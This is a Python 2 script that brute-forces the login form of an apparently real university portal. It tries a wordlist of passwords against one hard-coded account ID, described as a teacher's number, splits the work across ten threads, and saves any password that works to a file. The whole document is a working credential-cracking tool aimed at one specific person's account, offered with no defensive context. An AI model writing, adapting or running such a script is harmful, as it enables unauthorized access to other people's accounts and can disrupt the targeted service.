import urllib2
import urllib
import os
import threading
import time
login_url="http://myportal.sit.edu.cn/userPasswordValidate.portal"
teacher_num = '171081Y137'
exit_flag = 0

def AutoLogin(username,password):
    post_request = urllib.urlencode({'MIME Type':'application/x-www-form-urlencoded',
    'Login.Token1':username,
    'Login.Token2':password,
    'goto':'http://myportal.sit.edu.cn/loginSuccess.portal',
    'gotoOnFail':'http://myportal.sit.edu.cn/loginFailure.portal'})
    req = urllib2.Request(url = login_url, data=post_request)
    res = urllib2.urlopen(req).read()
    return res
def StatusCode(r):
    re1 = r.split('.')
    re2 = re1[1].split(';')
    if re2[0] == "handleLoginSuccessed()":
        return 'Successed'
    else:
        return 'Failed'

class Pikachu(threading.Thread):
    def __init__(self,id_num_):
        threading.Thread.__init__(self)
        self.id_num = id_num_
    def run(self):
        print "Starting... "
        Cracker(self.id_num)
        print "Exiting... "		
        os._exit()
#multiple thread, i is range of password	
def Cracker(id_num):
    if os.path.exists("Dictionary/pwd_dty_f.txt"):
        f = open("Dictionary/pwd_dty_f.txt","r")
        log_f = open("log"+str(id_num)+".txt","w")
    else:
        print "file not found. exit"
    pwd_ls = f.read().split('\n')
    i = 15351*(id_num-1)#153501 / 10
    global exit_flag
    exit_flag = 0
    #here will start crack password.
    while True:
        if i > 15351*id_num:
            break
        if exit_flag == 1:
            break
            os._exit()
        try:
            res = AutoLogin(teacher_num,pwd_ls[i])
        except IOError:
            print str(i)+"  Error Ocurred go back to previous index"
            i = i - 2                                       # it will plus in else statement;
            time.sleep(10)

        print pwd_ls[i]
        log_f.write(str(i)+ " " + pwd_ls[i] +"\n")
        #time.sleep(0.5)                                     #the server will not be able to handle quick request;
        if StatusCode(res) == 'Successed':
            print "password is ready"
            print pwd_ls[i]
            exit_flag = 1
            right_f = open("right_f.txt","a")
            right_f.write(teacher_num+":"+pwd_ls[i]+'\n')
            right_f.close()
	    #thread.interrupt_main()                                   #eixt alll program
            
            break
        else:
            i = i+1
    print "end while"
    f.close()
   
if __name__=="__main__":
    pikachu1 = Pikachu(1)
    pikachu2 = Pikachu(2)
    pikachu3 = Pikachu(3)
    pikachu4 = Pikachu(4)
    pikachu5 = Pikachu(5)
    pikachu6 = Pikachu(6)
    pikachu7 = Pikachu(7)
    pikachu8 = Pikachu(8)
    pikachu9 = Pikachu(9)
    pikachu10 = Pikachu(10)
  

    pikachu1.start()
    pikachu2.start()
    pikachu3.start()
    pikachu4.start()
    pikachu5.start()
    pikachu6.start()
    pikachu7.start()
    pikachu8.start()
    pikachu9.start()
    pikachu10.start()
